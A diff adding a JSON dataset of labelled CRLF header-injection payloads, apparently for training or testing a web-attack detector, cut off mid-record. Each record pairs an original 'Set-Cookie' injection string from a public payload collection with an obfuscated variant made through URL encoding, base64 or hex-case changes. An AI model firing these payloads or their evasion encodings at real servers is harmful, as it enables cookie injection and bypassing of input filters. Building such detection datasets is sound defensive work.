@@ -1,0 +1,3339 @@
+[
+  {
+    "id": "raw_logi_00001__obf01",
+    "payload": "%252F%2525%25250a0aSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d21497ce44d37f5482328cddef7152d2cc379a3c7363cd8e8e09207b05fabdf0",
+    "original_id": "raw_logi_00001",
+    "original_payload": "/%%0a0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%2525%25250a0aSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 90763835,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00001__obf02",
+    "payload": "LyUlMGEwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d21497ce44d37f5482328cddef7152d2cc379a3c7363cd8e8e09207b05fabdf0",
+    "original_id": "raw_logi_00001",
+    "original_payload": "/%%0a0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUlMGEwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 90764844,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00001__obf03",
+    "payload": "/%%0A0aSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d21497ce44d37f5482328cddef7152d2cc379a3c7363cd8e8e09207b05fabdf0",
+    "original_id": "raw_logi_00001",
+    "original_payload": "/%%0a0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%%0A0aSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 90765853,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00001__obf04",
+    "payload": "/%25%250a0aSet-Cookie%3Acrlf%3Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d21497ce44d37f5482328cddef7152d2cc379a3c7363cd8e8e09207b05fabdf0",
+    "original_id": "raw_logi_00001",
+    "original_payload": "/%%0a0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%25%250a0aSet-Cookie%3Acrlf%3Dinjection",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 90766862,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00002__obf01",
+    "payload": "%2F%250aSet-Cookie%3Acrlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "6e0d5d1497bef67ab9b8b8d54644580a0f13d52e2d2d96a9861b44b3b2c7b846",
+    "original_id": "raw_logi_00002",
+    "original_payload": "/%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%2F%250aSet-Cookie%3Acrlf=injection",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 90863838,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00002__obf02",
+    "payload": "LyUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "6e0d5d1497bef67ab9b8b8d54644580a0f13d52e2d2d96a9861b44b3b2c7b846",
+    "original_id": "raw_logi_00002",
+    "original_payload": "/%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 90864847,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00002__obf03",
+    "payload": "/%0ASet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "6e0d5d1497bef67ab9b8b8d54644580a0f13d52e2d2d96a9861b44b3b2c7b846",
+    "original_id": "raw_logi_00002",
+    "original_payload": "/%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%0ASet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 90865856,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00002__obf04",
+    "payload": "%252F%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "6e0d5d1497bef67ab9b8b8d54644580a0f13d52e2d2d96a9861b44b3b2c7b846",
+    "original_id": "raw_logi_00002",
+    "original_payload": "/%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 90866865,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00003__obf01",
+    "payload": "%2F%250d%250aSet-Cookie%3Acrlf%3Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b35b5aaa9dabf0a6acc039329a9909c1fb0e584ce6ad008f827d9cb63cf55b33",
+    "original_id": "raw_logi_00003",
+    "original_payload": "/%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%2F%250d%250aSet-Cookie%3Acrlf%3Dinjection",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 90963841,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00003__obf02",
+    "payload": "LyUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b35b5aaa9dabf0a6acc039329a9909c1fb0e584ce6ad008f827d9cb63cf55b33",
+    "original_id": "raw_logi_00003",
+    "original_payload": "/%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 90964850,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00003__obf03",
+    "payload": "/%0D%0aSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b35b5aaa9dabf0a6acc039329a9909c1fb0e584ce6ad008f827d9cb63cf55b33",
+    "original_id": "raw_logi_00003",
+    "original_payload": "/%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%0D%0aSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 90965859,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00003__obf04",
+    "payload": "%2F%250d%250ASet-Cookie%3Acrlf%3Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b35b5aaa9dabf0a6acc039329a9909c1fb0e584ce6ad008f827d9cb63cf55b33",
+    "original_id": "raw_logi_00003",
+    "original_payload": "/%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%2F%250d%250ASet-Cookie%3Acrlf%3Dinjection",
+    "obfuscation_chain": [
+      "percent_hex_case",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 90966868,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00004__obf01",
+    "payload": "%252F%25250dSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "44bfac9c9de750c3800e0452f5bd44d9b75d72f1cf8fe766a309869d28e8b434",
+    "original_id": "raw_logi_00004",
+    "original_payload": "/%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%25250dSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 91063844,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00004__obf02",
+    "payload": "LyUwZFNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "44bfac9c9de750c3800e0452f5bd44d9b75d72f1cf8fe766a309869d28e8b434",
+    "original_id": "raw_logi_00004",
+    "original_payload": "/%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUwZFNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 91064853,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00004__obf03",
+    "payload": "/%0DSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "44bfac9c9de750c3800e0452f5bd44d9b75d72f1cf8fe766a309869d28e8b434",
+    "original_id": "raw_logi_00004",
+    "original_payload": "/%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%0DSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91065862,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00004__obf04",
+    "payload": "LyUwZFNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "44bfac9c9de750c3800e0452f5bd44d9b75d72f1cf8fe766a309869d28e8b434",
+    "original_id": "raw_logi_00004",
+    "original_payload": "/%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUwZFNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 91066871,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00005__obf01",
+    "payload": "/%2523%250aSet-Cookie%3Acrlf%3Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e830e37ffae96a40f315c52bf2f041632c0d64e054711c5f67e5ac0ca08647a1",
+    "original_id": "raw_logi_00005",
+    "original_payload": "/%23%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%2523%250aSet-Cookie%3Acrlf%3Dinjection",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91163847,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00005__obf02",
+    "payload": "LyUyMyUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e830e37ffae96a40f315c52bf2f041632c0d64e054711c5f67e5ac0ca08647a1",
+    "original_id": "raw_logi_00005",
+    "original_payload": "/%23%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUyMyUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 91164856,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00005__obf03",
+    "payload": "/%23%0ASet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e830e37ffae96a40f315c52bf2f041632c0d64e054711c5f67e5ac0ca08647a1",
+    "original_id": "raw_logi_00005",
+    "original_payload": "/%23%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%23%0ASet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 91165865,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00005__obf04",
+    "payload": "%252F%252523%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e830e37ffae96a40f315c52bf2f041632c0d64e054711c5f67e5ac0ca08647a1",
+    "original_id": "raw_logi_00005",
+    "original_payload": "/%23%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%252523%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 91166874,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00006__obf01",
+    "payload": "%252F%252523%25250d%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "290c78384dd19aa67b86c789b67133adbe94e747d8ed992709d568664ee6c424",
+    "original_id": "raw_logi_00006",
+    "original_payload": "/%23%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%252523%25250d%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 91263850,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00006__obf02",
+    "payload": "LyUyMyUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "290c78384dd19aa67b86c789b67133adbe94e747d8ed992709d568664ee6c424",
+    "original_id": "raw_logi_00006",
+    "original_payload": "/%23%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUyMyUwZCUwYVNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 91264859,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00006__obf03",
+    "payload": "/%23\\r\\nSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "290c78384dd19aa67b86c789b67133adbe94e747d8ed992709d568664ee6c424",
+    "original_id": "raw_logi_00006",
+    "original_payload": "/%23%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%23\\r\\nSet-Cookie:crlf=injection",
+    "obfuscation_chain": [
+      "log_json_newline"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 91265868,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_logi_00006__obf04",
+    "payload": "%252F%252523%25250D%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "290c78384dd19aa67b86c789b67133adbe94e747d8ed992709d568664ee6c424",
+    "original_id": "raw_logi_00006",
+    "original_payload": "/%23%0d%0aSet-Cookie:crlf=injection",
+    "obfuscated_payload": "%252F%252523%25250D%25250aSet-Cookie%253Acrlf%253Dinjection",
+    "obfuscation_chain": [
+      "crlf_mixed_encoding",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode",
+      "url_decode_twice"
+    ],
+    "generation_seed": 91266877,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00007__obf01",
+    "payload": "/%%323%0dS%65t-%43%6Fo%6B%69e:c%72lf=injectio%6E",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "83746d39378a917c0a15273e2464a8a192bd3324a0ba61994a372c72a0597ddc",
+    "original_id": "raw_logi_00007",
+    "original_payload": "/%23%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "/%%323%0dS%65t-%43%6Fo%6B%69e:c%72lf=injectio%6E",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 91363853,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_logi_00007__obf02",
+    "payload": "LyUyMyUwZFNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "83746d39378a917c0a15273e2464a8a192bd3324a0ba61994a372c72a0597ddc",
+    "original_id": "raw_logi_00007",
+    "original_payload": "/%23%0dSet-Cookie:crlf=injection",
+    "obfuscated_payload": "LyUyMyUwZFNldC1Db29raWU6Y3JsZj1pbmplY3Rpb24=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 91364862,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_logi_00007__obf03",
+    "payload": "/%23%0DSet-Cookie:crlf=injection",
+    "label": 1,
+    "attack_type": "logi",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_logi_00007",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/CRLF%20Injection/Files/crlfinjection.txt",
+    "source_path": "CRLF Injection/Files/crlfinjection.txt",
